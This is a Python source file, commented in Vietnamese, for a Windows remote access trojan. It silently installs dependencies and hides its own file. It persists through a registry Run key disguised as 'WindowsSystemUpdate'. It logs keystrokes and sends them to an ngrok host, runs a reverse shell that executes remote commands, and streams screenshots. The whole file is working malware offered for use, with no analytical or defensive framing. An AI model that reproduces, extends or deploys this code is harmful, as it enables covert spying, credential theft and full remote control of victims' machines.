import socket
import subprocess
import sys
import os
import time
import winreg
import threading

# --- BƯỚC 1: TỰ ĐỘNG CÀI ĐẶT THƯ VIỆN NGẦM ---
def auto_install_packages():
    packages = {
        "mss": "mss",
        "opencv-python": "cv2",
        "numpy": "numpy",
        "keyboard": "keyboard"
    }
    for package, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package, "--quiet", "--no-warn-script-location"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
            except Exception:
                pass

auto_install_packages()

import cv2
import numpy as np
from mss import mss
import keyboard

# ==========================================
# CẤU HÌNH MẠNG QUA NGROK 
# ==========================================
SHELL_HOST = '0.tcp.ngrok.io'
SHELL_PORT = 15234  # <-- Thay số port ngrok cấp cho cổng 8080

LOG_HOST = '0.tcp.ngrok.io'
LOG_PORT = 18920    # <-- Thay số port ngrok cấp cho cổng 8081

SCREEN_HOST = '0.tcp.ngrok.io'
SCREEN_PORT = 19451 # <-- Thay số port ngrok cấp cho cổng 8082

SEND_INTERVAL = 10   # Thời gian gom phím gửi về server (giây)

def hide_self():
    """Tự động ẩn file chạy khỏi tầm mắt người dùng trên Windows"""
    try:
        current_file = os.path.abspath(__file__)
        if os.name == 'nt':
            subprocess.run(f'attrib +h +s "{current_file}"', shell=True, capture_output=True)
    except Exception:
        pass

def add_to_startup():
    """Tự động ghi vào Windows Registry để tự khởi động khi reset máy"""
    try:
        script_path = os.path.abspath(__file__)
        python_executable = sys.executable
        command = f'"{python_executable}" "{script_path}"'

        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, command)
        winreg.CloseKey(key)
    except Exception:
        pass

# ==========================================
# 1. TIẾN TRÌNH KEYLOGGER BỀN BỈ 24/7 (TỰ GỬI BÙ KHI MẤT MẠNG)
# ==========================================
class NetworkKeylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.lock = threading.Lock()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = f"[{name.upper()}]"

        with self.lock:
            self.log += name

    def send_logs(self):
        while True:
            time.sleep(self.interval)
            with self.lock:
                if not self.log:
                    continue
                current_log = self.log
                self.log = ""

            sent = False
            while not sent:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((LOG_HOST, LOG_PORT))
                    s.send(current_log.encode('utf-8'))
                    s.close()
                    sent = True
                except Exception:
                    time.sleep(10) # Mất mạng sẽ giữ lại log, đợi 10s gửi lại sau

    def start_keylogger(self):
        def run():
            try:
                keyboard.on_release(callback=self.callback)
                t = threading.Thread(target=self.send_logs, daemon=True)
                t.start()
                keyboard.wait()
            except Exception:
                time.sleep(10)
                self.start_keylogger()

        threading.Thread(target=run, daemon=True).start()

# ==========================================
# 2. TIẾN TRÌNH REMOTE SHELL 24/7
# ==========================================
def client_shell():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SHELL_HOST, SHELL_PORT))

            while True:
                command = s.recv(4096).decode('utf-8', errors='ignore')
                if not command or command.lower() == "exit":
                    break

                try:
                    output = subprocess.run(
                        command, 
                        shell=True, 
                        capture_output=True, 
                        text=True, 
                        encoding='utf-8', 
                        errors='ignore'
                    )
                    out_str = output.stdout + output.stderr
                    if not out_str:
                        out_str = "[+] Lệnh đã được thực thi thành công (không có phản hồi văn bản).\n"
                except Exception as sub_err:
                    out_str = f"[-] Lỗi khi thực thi lệnh: {str(sub_err)}\n"

                s.send(out_str.encode('utf-8'))

            s.close()
        except Exception:
            time.sleep(5)

# ==========================================
# 3. TIẾN TRÌNH SCREEN STREAMER 24/7
# ==========================================
def screen_streamer():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SCREEN_HOST, SCREEN_PORT))
            with mss() as sct:
                monitor = sct.monitors[1]
                while True:
                    img = sct.grab(monitor)
                    frame = np.array(img)
                    frame = cv2.resize(frame, (640, 360))
                    _, encoded_img = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 65])
                    
                    data = encoded_img.tobytes()
                    size = len(data)
                    s.sendall(size.to_bytes(4, byteorder='big') + data)
        except Exception:
            time.sleep(5)

# ==========================================
# HÀM KHỞI CHẠY CHÍNH
# ==========================================
if __name__ == "__main__":
    hide_self()
    add_to_startup()

    # 1. Chạy Keylogger ngầm bền bỉ
    keylogger = NetworkKeylogger(interval=SEND_INTERVAL)
    keylogger.start_keylogger()

    # 2. Chạy Screen Streamer trên luồng riêng
    threading.Thread(target=screen_streamer, daemon=True).start()

    # 3. Chạy vòng lặp Remote Shell ở luồng chính
    client_shell()
